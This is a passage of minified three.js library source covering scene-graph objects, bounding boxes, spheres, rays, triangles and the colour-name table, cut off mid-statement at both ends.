0,!1)})),Object.defineProperties(this,{position:{configurable:!0,enumerable:!0,value:e},rotation:{configurable:!0,enumerable:!0,value:t},quaternion:{configurable:!0,enumerable:!0,value:i},scale:{configurable:!0,enumerable:!0,value:n},modelViewMatrix:{value:new B},normalMatrix:{value:new x}}),this.matrix=new B,this.matrixWorld=new B,this.matrixAutoUpdate=K.DefaultMatrixAutoUpdate,this.matrixWorldNeedsUpdate=!1,this.layers=new N,this.visible=!0,this.castShadow=!1,this.receiveShadow=!1,this.frustumCulled=!0,this.renderOrder=0,this.userData={}}function ee(){K.call(this),this.type="Scene",this.background=null,this.fog=null,this.overrideMaterial=null,this.autoUpdate=!0,"undefined"!=typeof __THREE_DEVTOOLS__&&__THREE_DEVTOOLS__.dispatchEvent(new CustomEvent("observe",{detail:this}))}K.DefaultUp=new y(0,1,0),K.DefaultMatrixAutoUpdate=!0,K.prototype=Object.assign(Object.create(h.prototype),{constructor:K,isObject3D:!0,onBeforeRender:function(){},onAfterRender:function(){},applyMatrix:function(e){this.matrixAutoUpdate&&this.updateMatrix(),this.matrix.premultiply(e),this.matrix.decompose(this.position,this.quaternion,this.scale)},applyQuaternion:function(e){return this.quaternion.premultiply(e),this},setRotationFromAxisAngle:function(e,t){this.quaternion.setFromAxisAngle(e,t)},setRotationFromEuler:function(e){this.quaternion.setFromEuler(e,!0)},setRotationFromMatrix:function(e){this.quaternion.setFromRotationMatrix(e)},setRotationFromQuaternion:function(e){this.quaternion.copy(e)},rotateOnAxis:function(e,t){return V.setFromAxisAngle(e,t),this.quaternion.multiply(V),this},rotateOnWorldAxis:function(e,t){return V.setFromAxisAngle(e,t),this.quaternion.premultiply(V),this},rotateX:function(e){return this.rotateOnAxis(Y,e)},rotateY:function(e){return this.rotateOnAxis(Z,e)},rotateZ:function(e){return this.rotateOnAxis(Q,e)},translateOnAxis:function(e,t){return U.copy(e).applyQuaternion(this.quaternion),this.position.add(U.multiplyScalar(t)),this},translateX:function(e){return this.translateOnAxis(Y,e)},translateY:function(e){return this.translateOnAxis(Z,e)},translateZ:function(e){return this.translateOnAxis(Q,e)},localToWorld:function(e){return e.applyMatrix4(this.matrixWorld)},worldToLocal:function(e){return e.applyMatrix4(H.getInverse(this.matrixWorld))},lookAt:function(e,t,i){e.isVector3?G.copy(e):G.set(e,t,i);var n=this.parent;this.updateWorldMatrix(!0,!1),W.setFromMatrixPosition(this.matrixWorld),this.isCamera||this.isLight?H.lookAt(W,G,this.up):H.lookAt(G,W,this.up),this.quaternion.setFromRotationMatrix(H),n&&(H.extractRotation(n.matrixWorld),V.setFromRotationMatrix(H),this.quaternion.premultiply(V.inverse()))},add:function(e){if(arguments.length>1){for(var t=0;t<arguments.length;t++)this.add(arguments[t]);return this}return e===this?(console.error("THREE.Object3D.add: object can't be added as a child of itself.",e),this):(e&&e.isObject3D?(null!==e.parent&&e.parent.remove(e),e.parent=this,this.children.push(e),e.dispatchEvent($)):console.error("THREE.Object3D.add: object not an instance of THREE.Object3D.",e),this)},remove:function(e){if(arguments.length>1){for(var t=0;t<arguments.length;t++)this.remove(arguments[t]);return this}var i=this.children.indexOf(e);return-1!==i&&(e.parent=null,this.children.splice(i,1),e.dispatchEvent(J)),this},attach:function(e){return this.updateWorldMatrix(!0,!1),H.getInverse(this.matrixWorld),null!==e.parent&&(e.parent.updateWorldMatrix(!0,!1),H.multiply(e.parent.matrixWorld)),e.applyMatrix(H),e.updateWorldMatrix(!1,!1),this.add(e),this},getObjectById:function(e){return this.getObjectByProperty("id",e)},getObjectByName:function(e){return this.getObjectByProperty("name",e)},getObjectByProperty:function(e,t){if(this[e]===t)return this;for(var i=0,n=this.children.length;i<n;i++){var r=this.children[i].getObjectByProperty(e,t);if(void 0!==r)return r}},getWorldPosition:function(e){return void 0===e&&(console.warn("THREE.Object3D: .getWorldPosition() target is now required"),e=new y),this.updateMatrixWorld(!0),e.setFromMatrixPosition(this.matrixWorld)},getWorldQuaternion:function(e){return void 0===e&&(console.warn("THREE.Object3D: .getWorldQuaternion() target is now required"),e=new m),this.updateMatrixWorld(!0),this.matrixWorld.decompose(W,e,q),e},getWorldScale:function(e){return void 0===e&&(console.warn("THREE.Object3D: .getWorldScale() target is now required"),e=new y),this.updateMatrixWorld(!0),this.matrixWorld.decompose(W,X,e),e},getWorldDirection:function(e){void 0===e&&(console.warn("THREE.Object3D: .getWorldDirection() target is now required"),e=new y),this.updateMatrixWorld(!0);var t=this.matrixWorld.elements;return e.set(t[8],t[9],t[10]).normalize()},raycast:function(){},traverse:function(e){e(this);for(var t=this.children,i=0,n=t.length;i<n;i++)t[i].traverse(e)},traverseVisible:function(e){if(!1!==this.visible){e(this);for(var t=this.children,i=0,n=t.length;i<n;i++)t[i].traverseVisible(e)}},traverseAncestors:function(e){var t=this.parent;null!==t&&(e(t),t.traverseAncestors(e))},updateMatrix:function(){this.matrix.compose(this.position,this.quaternion,this.scale),this.matrixWorldNeedsUpdate=!0},updateMatrixWorld:function(e){this.matrixAutoUpdate&&this.updateMatrix(),(this.matrixWorldNeedsUpdate||e)&&(null===this.parent?this.matrixWorld.copy(this.matrix):this.matrixWorld.multiplyMatrices(this.parent.matrixWorld,this.matrix),this.matrixWorldNeedsUpdate=!1,e=!0);for(var t=this.children,i=0,n=t.length;i<n;i++)t[i].updateMatrixWorld(e)},updateWorldMatrix:function(e,t){var i=this.parent;if(!0===e&&null!==i&&i.updateWorldMatrix(!0,!1),this.matrixAutoUpdate&&this.updateMatrix(),null===this.parent?this.matrixWorld.copy(this.matrix):this.matrixWorld.multiplyMatrices(this.parent.matrixWorld,this.matrix),!0===t)for(var n=this.children,r=0,o=n.length;r<o;r++)n[r].updateWorldMatrix(!1,!0)},toJSON:function(e){var t=void 0===e||"string"==typeof e,i={};t&&(e={geometries:{},materials:{},textures:{},images:{},shapes:{}},i.metadata={version:4.5,type:"Object",generator:"Object3D.toJSON"});var n={};function r(t,i){return void 0===t[i.uuid]&&(t[i.uuid]=i.toJSON(e)),i.uuid}if(n.uuid=this.uuid,n.type=this.type,""!==this.name&&(n.name=this.name),!0===this.castShadow&&(n.castShadow=!0),!0===this.receiveShadow&&(n.receiveShadow=!0),!1===this.visible&&(n.visible=!1),!1===this.frustumCulled&&(n.frustumCulled=!1),0!==this.renderOrder&&(n.renderOrder=this.renderOrder),"{}"!==JSON.stringify(this.userData)&&(n.userData=this.userData),n.layers=this.layers.mask,n.matrix=this.matrix.toArray(),!1===this.matrixAutoUpdate&&(n.matrixAutoUpdate=!1),this.isMesh&&0!==this.drawMode&&(n.drawMode=this.drawMode),this.isMesh||this.isLine||this.isPoints){n.geometry=r(e.geometries,this.geometry);var o=this.geometry.parameters;if(void 0!==o&&void 0!==o.shapes){var a=o.shapes;if(Array.isArray(a))for(var s=0,c=a.length;s<c;s++){var l=a[s];r(e.shapes,l)}else r(e.shapes,a)}}if(void 0!==this.material)if(Array.isArray(this.material)){var h=[];for(s=0,c=this.material.length;s<c;s++)h.push(r(e.materials,this.material[s]));n.material=h}else n.material=r(e.materials,this.material);if(this.children.length>0){n.children=[];for(s=0;s<this.children.length;s++)n.children.push(this.children[s].toJSON(e).object)}if(t){var u=m(e.geometries),d=m(e.materials),p=m(e.textures),f=m(e.images);a=m(e.shapes);u.length>0&&(i.geometries=u),d.length>0&&(i.materials=d),p.length>0&&(i.textures=p),f.length>0&&(i.images=f),a.length>0&&(i.shapes=a)}return i.object=n,i;function m(e){var t=[];for(var i in e){var n=e[i];delete n.metadata,t.push(n)}return t}},clone:function(e){return(new this.constructor).copy(this,e)},copy:function(e,t){if(void 0===t&&(t=!0),this.name=e.name,this.up.copy(e.up),this.position.copy(e.position),this.quaternion.copy(e.quaternion),this.scale.copy(e.scale),this.matrix.copy(e.matrix),this.matrixWorld.copy(e.matrixWorld),this.matrixAutoUpdate=e.matrixAutoUpdate,this.matrixWorldNeedsUpdate=e.matrixWorldNeedsUpdate,this.layers.mask=e.layers.mask,this.visible=e.visible,this.castShadow=e.castShadow,this.receiveShadow=e.receiveShadow,this.frustumCulled=e.frustumCulled,this.renderOrder=e.renderOrder,this.userData=JSON.parse(JSON.stringify(e.userData)),!0===t)for(var i=0;i<e.children.length;i++){var n=e.children[i];this.add(n.clone())}return this}}),ee.prototype=Object.assign(Object.create(K.prototype),{constructor:ee,isScene:!0,copy:function(e,t){return K.prototype.copy.call(this,e,t),null!==e.background&&(this.background=e.background.clone()),null!==e.fog&&(this.fog=e.fog.clone()),null!==e.overrideMaterial&&(this.overrideMaterial=e.overrideMaterial.clone()),this.autoUpdate=e.autoUpdate,this.matrixAutoUpdate=e.matrixAutoUpdate,this},toJSON:function(e){var t=K.prototype.toJSON.call(this,e);return null!==this.background&&(t.object.background=this.background.toJSON(e)),null!==this.fog&&(t.object.fog=this.fog.toJSON()),t},dispose:function(){this.dispatchEvent({type:"dispose"})}});var te=[new y,new y,new y,new y,new y,new y,new y,new y],ie=new y,ne=new y,re=new y,oe=new y,ae=new y,se=new y,ce=new y,le=new y,he=new y,ue=new y,de=new y;function pe(e,t){this.min=void 0!==e?e:new y(1/0,1/0,1/0),this.max=void 0!==t?t:new y(-1/0,-1/0,-1/0)}function fe(e,t,i,n,r){var o,a;for(o=0,a=e.length-3;o<=a;o+=3){de.fromArray(e,o);var s=r.x*Math.abs(de.x)+r.y*Math.abs(de.y)+r.z*Math.abs(de.z),c=t.dot(de),l=i.dot(de),h=n.dot(de);if(Math.max(-Math.max(c,l,h),Math.min(c,l,h))>s)return!1}return!0}Object.assign(pe.prototype,{isBox3:!0,set:function(e,t){return this.min.copy(e),this.max.copy(t),this},setFromArray:function(e){for(var t=1/0,i=1/0,n=1/0,r=-1/0,o=-1/0,a=-1/0,s=0,c=e.length;s<c;s+=3){var l=e[s],h=e[s+1],u=e[s+2];l<t&&(t=l),h<i&&(i=h),u<n&&(n=u),l>r&&(r=l),h>o&&(o=h),u>a&&(a=u)}return this.min.set(t,i,n),this.max.set(r,o,a),this},setFromBufferAttribute:function(e){for(var t=1/0,i=1/0,n=1/0,r=-1/0,o=-1/0,a=-1/0,s=0,c=e.count;s<c;s++){var l=e.getX(s),h=e.getY(s),u=e.getZ(s);l<t&&(t=l),h<i&&(i=h),u<n&&(n=u),l>r&&(r=l),h>o&&(o=h),u>a&&(a=u)}return this.min.set(t,i,n),this.max.set(r,o,a),this},setFromPoints:function(e){this.makeEmpty();for(var t=0,i=e.length;t<i;t++)this.expandByPoint(e[t]);return this},setFromCenterAndSize:function(e,t){var i=ie.copy(t).multiplyScalar(.5);return this.min.copy(e).sub(i),this.max.copy(e).add(i),this},setFromObject:function(e){return this.makeEmpty(),this.expandByObject(e)},clone:function(){return(new this.constructor).copy(this)},copy:function(e){return this.min.copy(e.min),this.max.copy(e.max),this},makeEmpty:function(){return this.min.x=this.min.y=this.min.z=1/0,this.max.x=this.max.y=this.max.z=-1/0,this},isEmpty:function(){return this.max.x<this.min.x||this.max.y<this.min.y||this.max.z<this.min.z},getCenter:function(e){return void 0===e&&(console.warn("THREE.Box3: .getCenter() target is now required"),e=new y),this.isEmpty()?e.set(0,0,0):e.addVectors(this.min,this.max).multiplyScalar(.5)},getSize:function(e){return void 0===e&&(console.warn("THREE.Box3: .getSize() target is now required"),e=new y),this.isEmpty()?e.set(0,0,0):e.subVectors(this.max,this.min)},expandByPoint:function(e){return this.min.min(e),this.max.max(e),this},expandByVector:function(e){return this.min.sub(e),this.max.add(e),this},expandByScalar:function(e){return this.min.addScalar(-e),this.max.addScalar(e),this},expandByObject:function(e){var t,i;e.updateWorldMatrix(!1,!1);var n=e.geometry;if(void 0!==n)if(n.isGeometry){var r=n.vertices;for(t=0,i=r.length;t<i;t++)ie.copy(r[t]),ie.applyMatrix4(e.matrixWorld),this.expandByPoint(ie)}else if(n.isBufferGeometry){var o=n.attributes.position;if(void 0!==o)for(t=0,i=o.count;t<i;t++)ie.fromBufferAttribute(o,t).applyMatrix4(e.matrixWorld),this.expandByPoint(ie)}var a=e.children;for(t=0,i=a.length;t<i;t++)this.expandByObject(a[t]);return this},containsPoint:function(e){return!(e.x<this.min.x||e.x>this.max.x||e.y<this.min.y||e.y>this.max.y||e.z<this.min.z||e.z>this.max.z)},containsBox:function(e){return this.min.x<=e.min.x&&e.max.x<=this.max.x&&this.min.y<=e.min.y&&e.max.y<=this.max.y&&this.min.z<=e.min.z&&e.max.z<=this.max.z},getParameter:function(e,t){return void 0===t&&(console.warn("THREE.Box3: .getParameter() target is now required"),t=new y),t.set((e.x-this.min.x)/(this.max.x-this.min.x),(e.y-this.min.y)/(this.max.y-this.min.y),(e.z-this.min.z)/(this.max.z-this.min.z))},intersectsBox:function(e){return!(e.max.x<this.min.x||e.min.x>this.max.x||e.max.y<this.min.y||e.min.y>this.max.y||e.max.z<this.min.z||e.min.z>this.max.z)},intersectsSphere:function(e){return this.clampPoint(e.center,ie),ie.distanceToSquared(e.center)<=e.radius*e.radius},intersectsPlane:function(e){var t,i;return e.normal.x>0?(t=e.normal.x*this.min.x,i=e.normal.x*this.max.x):(t=e.normal.x*this.max.x,i=e.normal.x*this.min.x),e.normal.y>0?(t+=e.normal.y*this.min.y,i+=e.normal.y*this.max.y):(t+=e.normal.y*this.max.y,i+=e.normal.y*this.min.y),e.normal.z>0?(t+=e.normal.z*this.min.z,i+=e.normal.z*this.max.z):(t+=e.normal.z*this.max.z,i+=e.normal.z*this.min.z),t<=-e.constant&&i>=-e.constant},intersectsTriangle:function(e){if(this.isEmpty())return!1;this.getCenter(le),he.subVectors(this.max,le),ne.subVectors(e.a,le),re.subVectors(e.b,le),oe.subVectors(e.c,le),ae.subVectors(re,ne),se.subVectors(oe,re),ce.subVectors(ne,oe);var t=[0,-ae.z,ae.y,0,-se.z,se.y,0,-ce.z,ce.y,ae.z,0,-ae.x,se.z,0,-se.x,ce.z,0,-ce.x,-ae.y,ae.x,0,-se.y,se.x,0,-ce.y,ce.x,0];return!!fe(t,ne,re,oe,he)&&(!!fe(t=[1,0,0,0,1,0,0,0,1],ne,re,oe,he)&&(ue.crossVectors(ae,se),fe(t=[ue.x,ue.y,ue.z],ne,re,oe,he)))},clampPoint:function(e,t){return void 0===t&&(console.warn("THREE.Box3: .clampPoint() target is now required"),t=new y),t.copy(e).clamp(this.min,this.max)},distanceToPoint:function(e){return ie.copy(e).clamp(this.min,this.max).sub(e).length()},getBoundingSphere:function(e){return void 0===e&&console.error("THREE.Box3: .getBoundingSphere() target is now required"),this.getCenter(e.center),e.radius=.5*this.getSize(ie).length(),e},intersect:function(e){return this.min.max(e.min),this.max.min(e.max),this.isEmpty()&&this.makeEmpty(),this},union:function(e){return this.min.min(e.min),this.max.max(e.max),this},applyMatrix4:function(e){return this.isEmpty()?this:(te[0].set(this.min.x,this.min.y,this.min.z).applyMatrix4(e),te[1].set(this.min.x,this.min.y,this.max.z).applyMatrix4(e),te[2].set(this.min.x,this.max.y,this.min.z).applyMatrix4(e),te[3].set(this.min.x,this.max.y,this.max.z).applyMatrix4(e),te[4].set(this.max.x,this.min.y,this.min.z).applyMatrix4(e),te[5].set(this.max.x,this.min.y,this.max.z).applyMatrix4(e),te[6].set(this.max.x,this.max.y,this.min.z).applyMatrix4(e),te[7].set(this.max.x,this.max.y,this.max.z).applyMatrix4(e),this.setFromPoints(te),this)},translate:function(e){return this.min.add(e),this.max.add(e),this},equals:function(e){return e.min.equals(this.min)&&e.max.equals(this.max)}});var me=new pe;function ve(e,t){this.center=void 0!==e?e:new y,this.radius=void 0!==t?t:0}Object.assign(ve.prototype,{set:function(e,t){return this.center.copy(e),this.radius=t,this},setFromPoints:function(e,t){var i=this.center;void 0!==t?i.copy(t):me.setFromPoints(e).getCenter(i);for(var n=0,r=0,o=e.length;r<o;r++)n=Math.max(n,i.distanceToSquared(e[r]));return this.radius=Math.sqrt(n),this},clone:function(){return(new this.constructor).copy(this)},copy:function(e){return this.center.copy(e.center),this.radius=e.radius,this},empty:function(){return this.radius<=0},containsPoint:function(e){return e.distanceToSquared(this.center)<=this.radius*this.radius},distanceToPoint:function(e){return e.distanceTo(this.center)-this.radius},intersectsSphere:function(e){var t=this.radius+e.radius;return e.center.distanceToSquared(this.center)<=t*t},intersectsBox:function(e){return e.intersectsSphere(this)},intersectsPlane:function(e){return Math.abs(e.distanceToPoint(this.center))<=this.radius},clampPoint:function(e,t){var i=this.center.distanceToSquared(e);return void 0===t&&(console.warn("THREE.Sphere: .clampPoint() target is now required"),t=new y),t.copy(e),i>this.radius*this.radius&&(t.sub(this.center).normalize(),t.multiplyScalar(this.radius).add(this.center)),t},getBoundingBox:function(e){return void 0===e&&(console.warn("THREE.Sphere: .getBoundingBox() target is now required"),e=new pe),e.set(this.center,this.center),e.expandByScalar(this.radius),e},applyMatrix4:function(e){return this.center.applyMatrix4(e),this.radius=this.radius*e.getMaxScaleOnAxis(),this},translate:function(e){return this.center.add(e),this},equals:function(e){return e.center.equals(this.center)&&e.radius===this.radius}});var ge=new y,ye=new y,be=new y,we=new y,xe=new y,_e=new y,Me=new y;function Se(e,t){this.origin=void 0!==e?e:new y,this.direction=void 0!==t?t:new y}Object.assign(Se.prototype,{set:function(e,t){return this.origin.copy(e),this.direction.copy(t),this},clone:function(){return(new this.constructor).copy(this)},copy:function(e){return this.origin.copy(e.origin),this.direction.copy(e.direction),this},at:function(e,t){return void 0===t&&(console.warn("THREE.Ray: .at() target is now required"),t=new y),t.copy(this.direction).multiplyScalar(e).add(this.origin)},lookAt:function(e){return this.direction.copy(e).sub(this.origin).normalize(),this},recast:function(e){return this.origin.copy(this.at(e,ge)),this},closestPointToPoint:function(e,t){void 0===t&&(console.warn("THREE.Ray: .closestPointToPoint() target is now required"),t=new y),t.subVectors(e,this.origin);var i=t.dot(this.direction);return i<0?t.copy(this.origin):t.copy(this.direction).multiplyScalar(i).add(this.origin)},distanceToPoint:function(e){return Math.sqrt(this.distanceSqToPoint(e))},distanceSqToPoint:function(e){var t=ge.subVectors(e,this.origin).dot(this.direction);return t<0?this.origin.distanceToSquared(e):(ge.copy(this.direction).multiplyScalar(t).add(this.origin),ge.distanceToSquared(e))},distanceSqToSegment:function(e,t,i,n){ye.copy(e).add(t).multiplyScalar(.5),be.copy(t).sub(e).normalize(),we.copy(this.origin).sub(ye);var r,o,a,s,c=.5*e.distanceTo(t),l=-this.direction.dot(be),h=we.dot(this.direction),u=-we.dot(be),d=we.lengthSq(),p=Math.abs(1-l*l);if(p>0)if(o=l*h-u,s=c*p,(r=l*u-h)>=0)if(o>=-s)if(o<=s){var f=1/p;a=(r*=f)*(r+l*(o*=f)+2*h)+o*(l*r+o+2*u)+d}else o=c,a=-(r=Math.max(0,-(l*o+h)))*r+o*(o+2*u)+d;else o=-c,a=-(r=Math.max(0,-(l*o+h)))*r+o*(o+2*u)+d;else o<=-s?a=-(r=Math.max(0,-(-l*c+h)))*r+(o=r>0?-c:Math.min(Math.max(-c,-u),c))*(o+2*u)+d:o<=s?(r=0,a=(o=Math.min(Math.max(-c,-u),c))*(o+2*u)+d):a=-(r=Math.max(0,-(l*c+h)))*r+(o=r>0?c:Math.min(Math.max(-c,-u),c))*(o+2*u)+d;else o=l>0?-c:c,a=-(r=Math.max(0,-(l*o+h)))*r+o*(o+2*u)+d;return i&&i.copy(this.direction).multiplyScalar(r).add(this.origin),n&&n.copy(be).multiplyScalar(o).add(ye),a},intersectSphere:function(e,t){ge.subVectors(e.center,this.origin);var i=ge.dot(this.direction),n=ge.dot(ge)-i*i,r=e.radius*e.radius;if(n>r)return null;var o=Math.sqrt(r-n),a=i-o,s=i+o;return a<0&&s<0?null:a<0?this.at(s,t):this.at(a,t)},intersectsSphere:function(e){return this.distanceSqToPoint(e.center)<=e.radius*e.radius},distanceToPlane:function(e){var t=e.normal.dot(this.direction);if(0===t)return 0===e.distanceToPoint(this.origin)?0:null;var i=-(this.origin.dot(e.normal)+e.constant)/t;return i>=0?i:null},intersectPlane:function(e,t){var i=this.distanceToPlane(e);return null===i?null:this.at(i,t)},intersectsPlane:function(e){var t=e.distanceToPoint(this.origin);return 0===t||e.normal.dot(this.direction)*t<0},intersectBox:function(e,t){var i,n,r,o,a,s,c=1/this.direction.x,l=1/this.direction.y,h=1/this.direction.z,u=this.origin;return c>=0?(i=(e.min.x-u.x)*c,n=(e.max.x-u.x)*c):(i=(e.max.x-u.x)*c,n=(e.min.x-u.x)*c),l>=0?(r=(e.min.y-u.y)*l,o=(e.max.y-u.y)*l):(r=(e.max.y-u.y)*l,o=(e.min.y-u.y)*l),i>o||r>n?null:((r>i||i!=i)&&(i=r),(o<n||n!=n)&&(n=o),h>=0?(a=(e.min.z-u.z)*h,s=(e.max.z-u.z)*h):(a=(e.max.z-u.z)*h,s=(e.min.z-u.z)*h),i>s||a>n?null:((a>i||i!=i)&&(i=a),(s<n||n!=n)&&(n=s),n<0?null:this.at(i>=0?i:n,t)))},intersectsBox:function(e){return null!==this.intersectBox(e,ge)},intersectTriangle:function(e,t,i,n,r){xe.subVectors(t,e),_e.subVectors(i,e),Me.crossVectors(xe,_e);var o,a=this.direction.dot(Me);if(a>0){if(n)return null;o=1}else{if(!(a<0))return null;o=-1,a=-a}we.subVectors(this.origin,e);var s=o*this.direction.dot(_e.crossVectors(we,_e));if(s<0)return null;var c=o*this.direction.dot(xe.cross(we));if(c<0)return null;if(s+c>a)return null;var l=-o*we.dot(Me);return l<0?null:this.at(l/a,r)},applyMatrix4:function(e){return this.origin.applyMatrix4(e),this.direction.transformDirection(e),this},equals:function(e){return e.origin.equals(this.origin)&&e.direction.equals(this.direction)}});var Te=new y,Ee=new y,Ae=new y,Ce=new y,Pe=new y,Le=new y,Re=new y,ke=new y,Oe=new y,Ie=new y;function Be(e,t,i){this.a=void 0!==e?e:new y,this.b=void 0!==t?t:new y,this.c=void 0!==i?i:new y}Object.assign(Be,{getNormal:function(e,t,i,n){void 0===n&&(console.warn("THREE.Triangle: .getNormal() target is now required"),n=new y),n.subVectors(i,t),Te.subVectors(e,t),n.cross(Te);var r=n.lengthSq();return r>0?n.multiplyScalar(1/Math.sqrt(r)):n.set(0,0,0)},getBarycoord:function(e,t,i,n,r){Te.subVectors(n,t),Ee.subVectors(i,t),Ae.subVectors(e,t);var o=Te.dot(Te),a=Te.dot(Ee),s=Te.dot(Ae),c=Ee.dot(Ee),l=Ee.dot(Ae),h=o*c-a*a;if(void 0===r&&(console.warn("THREE.Triangle: .getBarycoord() target is now required"),r=new y),0===h)return r.set(-2,-1,-1);var u=1/h,d=(c*s-a*l)*u,p=(o*l-a*s)*u;return r.set(1-d-p,p,d)},containsPoint:function(e,t,i,n){return Be.getBarycoord(e,t,i,n,Ce),Ce.x>=0&&Ce.y>=0&&Ce.x+Ce.y<=1},getUV:function(e,t,i,n,r,o,a,s){return this.getBarycoord(e,t,i,n,Ce),s.set(0,0),s.addScaledVector(r,Ce.x),s.addScaledVector(o,Ce.y),s.addScaledVector(a,Ce.z),s},isFrontFacing:function(e,t,i,n){return Te.subVectors(i,t),Ee.subVectors(e,t),Te.cross(Ee).dot(n)<0}}),Object.assign(Be.prototype,{set:function(e,t,i){return this.a.copy(e),this.b.copy(t),this.c.copy(i),this},setFromPointsAndIndices:function(e,t,i,n){return this.a.copy(e[t]),this.b.copy(e[i]),this.c.copy(e[n]),this},clone:function(){return(new this.constructor).copy(this)},copy:function(e){return this.a.copy(e.a),this.b.copy(e.b),this.c.copy(e.c),this},getArea:function(){return Te.subVectors(this.c,this.b),Ee.subVectors(this.a,this.b),.5*Te.cross(Ee).length()},getMidpoint:function(e){return void 0===e&&(console.warn("THREE.Triangle: .getMidpoint() target is now required"),e=new y),e.addVectors(this.a,this.b).add(this.c).multiplyScalar(1/3)},getNormal:function(e){return Be.getNormal(this.a,this.b,this.c,e)},getPlane:function(e){return void 0===e&&(console.warn("THREE.Triangle: .getPlane() target is now required"),e=new y),e.setFromCoplanarPoints(this.a,this.b,this.c)},getBarycoord:function(e,t){return Be.getBarycoord(e,this.a,this.b,this.c,t)},getUV:function(e,t,i,n,r){return Be.getUV(e,this.a,this.b,this.c,t,i,n,r)},containsPoint:function(e){return Be.containsPoint(e,this.a,this.b,this.c)},isFrontFacing:function(e){return Be.isFrontFacing(this.a,this.b,this.c,e)},intersectsBox:function(e){return e.intersectsTriangle(this)},closestPointToPoint:function(e,t){void 0===t&&(console.warn("THREE.Triangle: .closestPointToPoint() target is now required"),t=new y);var i,n,r=this.a,o=this.b,a=this.c;Pe.subVectors(o,r),Le.subVectors(a,r),ke.subVectors(e,r);var s=Pe.dot(ke),c=Le.dot(ke);if(s<=0&&c<=0)return t.copy(r);Oe.subVectors(e,o);var l=Pe.dot(Oe),h=Le.dot(Oe);if(l>=0&&h<=l)return t.copy(o);var u=s*h-l*c;if(u<=0&&s>=0&&l<=0)return i=s/(s-l),t.copy(r).addScaledVector(Pe,i);Ie.subVectors(e,a);var d=Pe.dot(Ie),p=Le.dot(Ie);if(p>=0&&d<=p)return t.copy(a);var f=d*c-s*p;if(f<=0&&c>=0&&p<=0)return n=c/(c-p),t.copy(r).addScaledVector(Le,n);var m=l*p-d*h;if(m<=0&&h-l>=0&&d-p>=0)return Re.subVectors(a,o),n=(h-l)/(h-l+(d-p)),t.copy(o).addScaledVector(Re,n);var v=1/(m+f+u);return i=f*v,n=u*v,t.copy(r).addScaledVector(Pe,i).addScaledVector(Le,n)},equals:function(e){return e.a.equals(this.a)&&e.b.equals(this.b)&&e.c.equals(this.c)}});var De={aliceblue:15792383,antiquewhite:16444375,aqua:65535,aquamarine:8388564,azure:15794175,beige:16119260,bisque:16770244,black:0,blanchedalmond:16772045,blue:255,blueviolet:9055202,brown:10824234,burlywood:14596231,cadetblue:6266528,chartreuse:8388352,chocolate:13789470,coral:16744272,cornflowerblue:6591981,cornsilk:16775388,crimson:14423100,cyan:65535,darkblue:139,darkcyan:35723,darkgoldenrod:12092939,darkgray:11119017,darkgreen:25600,darkgrey:11119017,darkkhaki:12433259,darkmagenta:9109643,darkolivegreen:5597999,darkorange:16747520,darkorchid:10040012,darkred:9109504,darksalmon:15308410,darkseagreen:9419919,darkslateblue:4734347,darkslategray:3100495,darkslategrey:3100495,darkturquoise:52945,darkviolet:9699539,deeppink:16716947,deepskyblue:49151,dimgray:6908265,dimgrey:6908265,dodgerblue:2003199,firebrick:11674146,floralwhite:16775920,forestgreen:2263842,fuchsia:16711935,gainsboro:14474460,ghostwhite:16316671,gold:16766720,goldenrod:14329120,gray:8421504,green:32768,greenyellow:11403055,grey:8421504,honeydew:15794160,hotpink:16738740,indianred:13458524,indigo:4915330,ivory:16777200,khaki:15787660,lavender:15132410,lavenderblush:16773365,lawngreen:8190976,lemonchiffon:16775885,lightblue:11393254,lightcoral:15761536,lightcyan:14745599,lightgoldenrodyellow:16448210,lightgray:13882323,lightgreen:9498256,lightgrey:13882323,lightpink:16758465,lightsalmon:16752762,lightseagreen:2142890,lightskyblue:8900346,lightslategray:7833753,lightslategrey:7833753,lightsteelblue:11584734,lightyellow:16777184,lime:65280,limegreen:3329330,linen:16445670,magenta:16711935,maroon:8388608,mediumaquamarine:6737322,mediumblue:205,mediumorchid:12211667,mediumpurple:9662683,mediumseagreen:3978097,mediumslateblue:8087790,mediumspringgreen:64154,mediumturquoise:4772300,mediumvioletred:13047173,midnightblue:1644912,mintcream:16121850,mistyrose:16770273,moccasin:16770229,navajowhite:16768685,navy:128,oldlace:16643558,olive:8421376,olivedrab:7048739,orange:16753920,orangered:16729344,orchid:14315734,palegoldenrod:15657130,palegreen:10025880,paleturquoise:11529966,palevioletred:14381203,papayawhip:16773077,peachpuff:16767673,peru:13468991,pink:16761035,plum:14524637,powderblue:11591910,purple:8388736,rebeccapurple:6697881,red:16711680,rosybrown:12357519,royalblue:4286945,saddlebrown:9127187,salmon:16416882,sandybrown:16032864,seagreen:3050327,seashell:16774638,sienna:10506797,silver:12632256,skyblue:8900331,slateblue:6970061,slategray:7372944,slategrey:7372944,snow:16775930,springgreen:65407,steelblue:4620980,tan:13808780,teal:32896,thistle:14204888,tomato:16737095,turquoise:4251856,violet:15631086,wheat:16113331,white:16777215,whitesmoke:16119285,yellow:16776960,yellowgreen:10145074},ze={h:0,s:0,l:0},Fe={h:0,s:0,l:0};function Ne(e,t,i){return void 0===t&&void 0===i?this.set(e):this.setRGB(e,t,i)}function je(e,t,i){return i<0&&(i+=1),i>1&&(i-=1),i<1/6?e+6*(t-e)*i:i<.5?t:i<2/3?e+6*(t-e)*(2/3-i):e}function Ue(e){return e<.04045?.0773993808*e:Math.pow(.9478672986*e+.0521327014,2.4)}function Ve(e){return e<.0031308?12.92*e:1.055*Math.pow(e,.41666)-.055}function He(e,t,i,n,r,o){this.a=e,this.b=t,this.c=i,this.normal=n&&n.isVector3?n:new y,this.vertexNormals=Array.isArray(n)?n:[],this.color=r&&r.isColor?r:new Ne,this.vertexColors=Array.isArray(r)?r:[],this.materialIndex=void 0!==o?o:0}Object.assign(Ne.prototype,{isColor:!0,r:1,g:1,b:1,set:function(e){return e&&e.isColor?this.copy(e):"number"==typeof e?this.setHex(e):"string"==typeof e&&this.setStyle(e),this},setScalar:function(e){return this.r=e,this.g=e,this.b=e,this},setHex:function(e){return e=Math.floor(e),this.r=(e>>16&255)/255,this.g=(e>>8&255)/255,this.b=(255&e)/255,this},setRGB:function(e,t,i){return this.r=e,this.g=t,this.b=i,this},setHSL:function(e,t,i){if(e=p.euclideanModulo(e,1),t=p.clamp(t,0,1),i=p.clamp(i,0,1),0===t)this.r=this.g=this.b=i;else{var n=i<=.5?i*(1+t):i+t-i*t,r=2*i-n;this.r=je(r,n,e+1/3),this.g=je(r,n,e),this.b=je(r,n,e-1/3)}return this},setStyle:function(e){function t(t){void 